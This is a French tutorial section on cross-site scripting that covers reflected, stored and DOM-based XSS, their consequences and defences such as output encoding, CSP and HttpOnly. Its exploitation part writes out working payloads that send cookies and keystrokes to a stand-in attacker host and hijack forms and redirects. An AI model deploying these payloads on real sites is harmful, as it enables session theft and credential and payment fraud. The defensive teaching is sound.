### **3. Failles XSS (Cross-Site Scripting)**  
#### **Définition** :  
Les failles XSS (Cross-Site Scripting) surviennent lorsque **une application web intègre des données non fiables (souvent fournies par l’utilisateur) dans une page sans validation ou encodage adéquat**. Cela permet à un attaquant d’exécuter du code malveillant (généralement du JavaScript) dans le navigateur de la victime, entraînant des conséquences graves comme le vol de cookies, la déviation de sessions, ou l’usurpation d’identité.

---

### **Types de failles XSS**  
#### **1. XSS réfléchi (Reflected XSS)**  
- **Principe** : Le code malveillant est injecté via une requête HTTP (ex. : URL, formulaire) et **exécuté immédiatement** dans le navigateur de la victime.  
- **Exemple** :  
  ```url
  https://victime.com/recherche?q=<script>alert('xss')</script>
  ```  
- **Cas réel** : Un lien trompeur envoyé par email ou réseau social. Lorsque la victime clique dessus, le script s’exécute et redirige vers un site malveillant.  

#### **2. XSS stocké (Stored XSS)**  
- **Principe** : Le code malveillant est **enregistré dans une base de données** (ex. : forum, commentaires) et exécuté chaque fois qu’un utilisateur consulte la page infectée.  
- **Exemple** :  
  ```html
  <img src=x onerror="voler_cookie()">
  ```  
  → Stocké dans un commentaire, ce script s’exécute pour tous les utilisateurs visitant la page.  
- **Cas réel** : Le **Samy Worm** (2005) a exploité une faille XSS persistante sur MySpace pour ajouter 1 million d’amis à son auteur en 24h.  

#### **3. XSS basé sur le DOM (DOM-based XSS)**  
- **Principe** : Le code malveillant est exécuté via une **vulnérabilité dans le code JavaScript côté client**, sans interaction avec le serveur.  
- **Exemple** :  
  ```javascript
  document.write(location.hash.substring(1)); // Vulnérable à DOM XSS
  ```  
  → Injection via une URL comme :  
  ```url
  http://victime.com/#<script>alert(1)</script>
  ```  

---

### **Exploitation pratique**  
#### **Techniques courantes** :  
1. **Vol de cookies** :  
   ```javascript
   <script>
     fetch('http://attaquant.com/steal', {
       method: 'POST',
       body: document.cookie
     });
   </script>
   ```  
   → Le cookie de session est envoyé au serveur de l’attaquant.  

2. **Keylogging** :  
   ```javascript
   document.addEventListener('keypress', function(e) {
     fetch('http://attaquant.com/log?key=' + e.key);
   });
   ```  
   → Capture des frappes clavier de la victime.  

3. **Redirection vers un site malveillant** :  
   ```javascript
   window.location.href = "http://phishing.com";
   ```  

4. **Déviation de panier d’achat** :  
   ```javascript
   document.getElementById('panier').innerHTML = 
     '<form action="http://attaquant.com/capture" method="POST">...';
   ```  
   → Modification du panier d’un site marchand pour rediriger les paiements.  

---

### **Conséquences des attaques XSS**  
1. **Vol de cookies de session** :  
   - Usurpation d’identité sans connaissance du mot de passe.  
2. **Vol d’identifiants de connexion** :  
   - Clonage de formulaires de login pour capturer les identifiants.  
3. **Accès à des données sensibles** :  
   - Exfiltration de données personnelles, numéros de carte bancaire, etc.  
4. **Déviation d’opérations** :  
   - Modification de transactions financières ou de commandes.  
5. **Défiguration de site** :  
   - Affichage de contenu malveillant ou messages offensants.  
6. **Propagation de malwares** :  
   - Téléchargement automatique de logiciels malveillants via des scripts.  

---

### **Prévention et bonnes pratiques**  
#### **1. Validation des entrées** :  
- **Stratégie "Whitelist"** : Accepter uniquement des données connues et valides (ex. : emails, numéros).  
- **Filtrage des caractères spéciaux** : Bloquer ou encoder les caractères dangereux (`<`, `>`, `"`, `'`, `(`, `)`).  
- **Exemple en PHP** :  
  ```php
  $email = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);
  ```  

#### **2. Encodage des sorties** :  
- **HTML** : Utiliser `htmlspecialchars()` en PHP ou `Encoder.encodeForHtml()` en Java.  
- **JavaScript** : Encoder les données avec `encodeURI()` ou `encodeURIComponent()`.  
- **URL** : Utiliser `rawurlencode()` en PHP ou `encodeURI()` en JavaScript.  

#### **3. En-têtes de sécurité** :  
- **Content-Security-Policy (CSP)** : Interdire l’exécution de scripts externes.  
  ```http
  Content-Security-Policy: script-src 'self';
  ```  
- **HttpOnly** : Protéger les cookies contre l’accès via JavaScript.  
  ```http
  Set-Cookie: sessionid=123; HttpOnly; Secure;
  ```  
- **X-Content-Type-Options: nosniff** : Empêcher le MIME sniffing.  

#### **4. Outils et bibliothèques** :  
- **OWASP AntiSamy** : Nettoyer les données HTML/JS avant stockage.  
- **Java** : Utiliser `ESAPI.encoder().encodeForHTML()`.  
- **PHP** : Bibliothèque `HTML Purifier` pour valider et nettoyer le HTML.  

#### **5. Tests de sécurité** :  
- **BurpSuite** : Interception et test de payloads malveillants.  
- **OWASP ZAP** : Analyse automatisée des vulnérabilités.  
- **Mutillidae** : Plateforme OWASP pour pratiquer des attaques XSS.  

---

### **Cas réels et exemples historiques**  
1. **Samy Worm (2005)** :  
   - Attaque XSS persistante sur MySpace pour propager un virus.  
2. **Vol de cookies via formulaires de recherche** :  
   - Injection de scripts dans des champs de recherche non sécurisés.  
3. **XSS via fichiers uploadés** :  
   - Upload de fichiers `.svg` contenant du code JavaScript.  

---

### **Don't try this home**
